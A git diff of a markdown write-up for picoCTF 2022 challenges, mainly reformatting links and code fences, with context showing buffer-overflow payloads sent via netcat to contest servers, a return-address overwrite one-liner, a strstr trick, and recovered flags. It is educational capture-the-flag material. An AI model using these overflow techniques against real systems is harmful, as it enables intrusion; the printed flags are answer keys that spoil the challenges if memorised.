@@ -1,24 +1,35 @@
 # **Table of Contents**
-- [Binary Exploitation](./picoCTF_2022.md#Binary-Exploitation)
-- [Cryptography](./picoCTF_2022.md#Cryptography)
-- [Forensics](./picoCTF_2022.md#Forensics)
-- [Reverse Engineering](./picoCTF_2022.md#Reverse-Engineering)
-- [Web Exploitation](./picoCTF_2022.md#Web-Exploitation)
+| Categories                                  | Completed | Progress                                                     |
+| ------------------------------------------- | --------- | ------------------------------------------------------------ |
+| [Binary Exploitation](#Binary-Exploitation) | 6/14      | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/43) |
+| [Cryptography](#Cryptography)               | 10/14     | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/71) |
+| [Forensics](#Forensics)                     | 7/13      | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/54) |
+| [Reverse Engineering](#Reverse-Engineering) | 9/12      | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/75) |
+| [Web Exploitation](#Web-Exploitation)       | 10/12     | ![](https://us-central1-progress-markdown.cloudfunctions.net/progress/83) |
 
 # **Binary Exploitation**
-- [basic-file-exploit](./picoCTF_2022.md#basic-file-exploit)
-- [buffer overflow 0](./picoCTF_2022.md#buffer-overflow-0)
-- [CVE-XXXX-XXXX](./picoCTF_2022.md#CVE-XXXX-XXXX)
-- [buffer overflow 1](./picoCTF_2022.md#buffer-overflow-1)
-- [RPS](./picoCTF_2022.md#RPS)
+- [x] [basic-file-exploit](#basic-file-exploit)
+- [x] [buffer overflow 0](./picoCTF_2022.md#buffer-overflow-0)
+- [x] [CVE-XXXX-XXXX](#CVE-XXXX-XXXX)
+- [x] [buffer overflow 1](#buffer-overflow-1)
+- [ ] x-sixty-what
+- [x] [RPS](#RPS)
+- [x] buffer overflow 2
+- [ ] buffer overflow 3
+- [ ] flag leak
+- [ ] ropfu
+- [ ] wine
+- [ ] function overwrite
+- [ ] stack cache
+- [ ] solfire
 
 ## **basic-file-exploit**
 
 ### ***Description***
-The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! <br>
-Connect to the program with netcat: <br>
+The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! <br>Connect to the program with netcat: <br>
 `$ nc saturn.picoctf.net 50366` <br>
 The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/538/program-redacted.c).
+
 <details>
     <summary>Hint 1</summary>
     Try passing in things the program doesn't expect. Like a string instead of a number.
@@ -31,7 +42,7 @@ The pointer is outputted if `entry_number==0`, or if `strtol` errors.
 The value of entry needs to be a letter for `strtol` to error.
 The `data_read` function is called when option 2 is selected. Therefore, to trigger the flag, choose option 2 and pass in any string.
 
-```
+```python
 └─$ nc saturn.picoctf.net 50366
 Hi, welcome to my echo chamber!
 Type '1' to enter a phrase into our database
@@ -85,19 +96,19 @@ The error here is the vulnerable `strcpy` function, because it will write all th
 
 Attempting to execute vuln shows that it needs a `flag.txt`, so I created a new `flag.txt` file with some random string. This will be used later to test whether the contents of flag are printed out onto the console.
 
-```
+```bash
 └─$ cat flag.txt
 picoCTF{random_string}
 ```
 
 I am going to write 16 A's into `input.txt` and feed it into the vuln program to see what happens.
 
-```
+```bash
 └─$ python3 -c "print('A'*16)" > input.txt ; ./vuln < input.txt
 Input: The program will exit now
 ```
 
-As expected, nothing much and the program exits nicely. Time to use GDB! Reason why I am using multiple A's is because since A is 0x41, I just have to look multiple occurences of 0x41 in the stack. Run `gdb vuln` and then `layout asm` to get the assembly as well as the debugger console. If you are using `layout asm`, the memory addresses displayed may not be correct (not sure why). For example, it might say main starts at address 0x1382, which is incorrect. I recommend running the program once to display the correct addresses, so main should start at `0x56556382`.
+As expected, nothing much and t	he program exits nicely. Time to use GDB! Reason why I am using multiple A's is because since A is 0x41, I just have to look multiple occurrences of 0x41 in the stack. Run `gdb vuln` and then `layout asm` to get the assembly as well as the debugger console. If you are using `layout asm`, the memory addresses displayed may not be correct (not sure why). For example, it might say main starts at address 0x1382, which is incorrect. I recommend running the program once to display the correct addresses, so main should start at `0x56556382`.
 
 Correct memory addresses:
 ![after_layout_asm](Binary_Exploitation/buffer_overflow_0/after_layout_asm.png)
@@ -114,7 +125,7 @@ Frame info at the breakpoint after strcpy:
 
 I am going to try and corrupt ebx register and possibly create a segmentation fault, I will write 20 A's into `input.txt` now and see what happens.
 
-```
+```bash
 └─$ python3 -c "print('A'*20)" > input.txt ; ./vuln < input.txt
 Input: picoCTF{random_string}
 ```
@@ -129,7 +140,7 @@ If you look at memory address `0x5655635b`, the program allocates `0x14`, or in 
 
 Any input greater than 19 characters will segfault the program, which then the signal handler will capture and call `sigsegv_handler` and will print the flag and fully exit. I took `input.txt` which already has 20 A's and fed the contents to the netcat connection.
 
-```
+```bash
 └─$ python3 -c "print('A'*20)" > input.txt ; nc saturn.picoctf.net 64712 < input.txt
 Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_81929e72}
 ```
@@ -169,7 +180,7 @@ You can view source [here](https://artifacts.picoctf.net/c/253/vuln.c). And conn
 ### ***Writeup***
 Looking at the source code in `vuln.c`, it seems that after calling the print function in the `main()` function, it jumps to the `vuln()` function and takes user input using `gets()` and stores it in the local character buffer `buf` of size 32. It then prints the return address of the function, and the program ends.
 
-```
+```bash
 └─$ python3 -c "print('A'*32)" > input.txt ; ./vuln < input.txt
 Please enter your string:
 Okay, time to return... Fingers Crossed... Jumping to 0x804932f
@@ -184,14 +195,14 @@ Running `gdb vuln` followed by `layout asm` shows the assembly code of the binar
 Set a breakpoint at the start of address `0x80492a3` right after the `gets()` function is called. Running the debugger with `r < input.txt` I run `info frame` and notice that the return address is the `saved eip`, and the `eip` register is at address `0xffffd0bc` on the stack. Then running `x/64xb $sp`, I notice that `0x41` start appearing at address `0xffffd090` on the stack, which is where `buf` is.
 Doing address subtraction shows that there is 44 bytes between where `buf` is and where the return address is.
 
-```
+```bash
 (gdb) p 0xffffd0bc-0xffffd090
 $1 = 44
 ```
 
 Originally, my payload which was 44 A's followed by `\x08\x04\x93\x2f` did not work because the byte order is in little endian. Therefore, I had to reverse my payload as well as include a null terminating character to finish it off.
 
-```
+```bash
 └─$ python3 -c "import sys; sys.stdout.buffer.write(b'\x41'*44+b'\xf6\x91\x04\x08'+b'\x0a')" > input.txt ; nc saturn.picoctf.net 57610 < input.txt
 Please enter your string:
 Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
@@ -207,6 +218,7 @@ Here's a program that plays rock, paper, scissors against you. I hear something 
 Connect to the program with netcat: <br>
 `$ nc saturn.picoctf.net 50305` <br>
 The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/445/game-redacted.c).
+
 <details>
     <summary>Hint 1</summary>
     How does the program check if you won?
@@ -215,7 +227,7 @@ The program's source code with the flag redacted can be downloaded [here](https:
 ### ***Writeup***
 Looking at the source code, I need `wins` to be greater than 5 for the program to print the flag to the console. The `wins` variable is accumulated if `play()` returns true, which is if `strstr(player_turn, loses[computer_turn])` also returns a non-zero result. Looking at the man pages for `strstr` shows that it is in the form of `char *strstr(const char *haystack, const char *needle)`, where `strstr()` finds the first occurrence of the substring `needle` in the string `haystack`. It then returns a pointer to the beginning of the located substring. Therefore, the program tries to find the specific string of `loses[computer_turn]` in the `player_turn` string that we provided to the program, where `char* loses[3] = {"paper", "scissors", "rock"};`. Essentially, create a string where if `strstr` tries to find the substring match it succeeds on all occurences, so such a string that does that is `rockpaperscissors` because each choice is a substring in that input string.
 
-```
+```bash
 ─$ nc saturn.picoctf.net 50305
 Welcome challenger to the game of Rock, Paper, Scissors
 For anyone that beats me 5 times in a row, I will offer up a flag I found
@@ -256,17 +268,17 @@ Type '2' to exit the program
 Flag: `picoCTF{50M3_3X7R3M3_1UCK_D80B11AA}`
 
 # **Cryptography**
-- [basic-mod1](./picoCTF_2022.md#basic-mod1)
-- [basic-mod2](./picoCTF_2022.md#basic-mod2)
-- [credstuff](./picoCTF_2022.md#credstuff)
-- [morse-code](./picoCTF_2022.md#morse-code)
-- [rail-fence](./picoCTF_2022.md#rail-fence)
-- [substitution0](./picoCTF_2022.md#substitution0)
-- [substitution1](./picoCTF_2022.md#substitution1)
-- [substitution2](./picoCTF_2022.md#substitution2)
-- [transposition-trial](./picoCTF_2022.md#transposition-trial)
-- [Vigenere](./picoCTF_2022.md#Vigenere)
-- [diffie-hellman](./picoCTF_2022.md#diffie-hellman)
+- [basic-mod1](#basic-mod1)
+- [basic-mod2](#basic-mod2)
+- [credstuff](#credstuff)
+- [morse-code](#morse-code)
+- [rail-fence](#rail-fence)
+- [substitution0](#substitution0)
+- [substitution1](#substitution1)
+- [substitution2](#substitution2)
+- [transposition-trial](#transposition-trial)
+- [Vigenere](#Vigenere)
+- [diffie-hellman](#diffie-hellman)
 
 ## **basic-mod1**
 
@@ -288,12 +300,12 @@ Wrap your decrypted message in the picoCTF flag format (i.e. `picoCTF{decrypted_
 Make a [python script](./Cryptography/basic-mod1/basic_mod1.py) that will parse the text file and mod every number.
 
 `message.txt`:
-```
+```bash
 └─$ cat message.txt
 54 396 131 198 225 258 87 258 128 211 57 235 114 258 144 220 39 175 330 338 297 288
 ```
 output of `basic_mod1.py`:
-```
+```bash
 └─$ python3 basic_mod1.py
 picoCTF{R0UND_N_R0UND_79C18FB3}
 ```
@@ -324,12 +336,12 @@ Wrap your decrypted message in the picoCTF flag format (i.e. `picoCTF{decrypted_
 Make a [python script](./Cryptography/basic-mod2/basic_mod2.py) that will parse the text file and mod every number and then find the modular inverse using `pow(a,-1,x)`.
 
 `message.txt`:
-```
+```bash
 └─$ cat message.txt
 268 413 110 190 426 419 108 229 310 379 323 373 385 236 92 96 169 321 284 185 154 137 186
 ```
 output of `basic_mod2.py`:
-```
+```bash
 └─$ python3 basic_mod2.py
 picoCTF{1NV3R53LY_H4RD_C680BDC1}
 ```
@@ -637,13 +649,13 @@ Shift 5 backwards: C4354R_C1PH3R_15_4_817_0U7D473D_2DBF03F7
 Flag: `C4354R_C1PH3R_15_4_817_0U7D473D_2DBF03F7`
 
 # **Forensics**
-- [Enhance!](./picoCTF_2022.md#Enhance)
-- [File types](./picoCTF_2022.md#File-types)
-- [Lookey here](./picoCTF_2022.md#Lookey-here)
-- [Packets Primer](./picoCTF_2022.md#Packets-Primer)
-- [Redaction gone wrong](./picoCTF_2022.md#Redaction-gone-wrong)
-- [Sleuthkit Intro](./picoCTF_2022.md#Sleuthkit-Intro)
-- [St3g0](./picoCTF_2022.md#St3g0)
+- [Enhance!](#Enhance)
+- [File types](#File-types)
+- [Lookey here](#Lookey-here)
+- [Packets Primer](#Packets-Primer)
+- [Redaction gone wrong](#Redaction-gone-wrong)
+- [Sleuthkit Intro](#Sleuthkit-Intro)
+- [St3g0](#St3g0)
 
 ## **Enhance!**
 
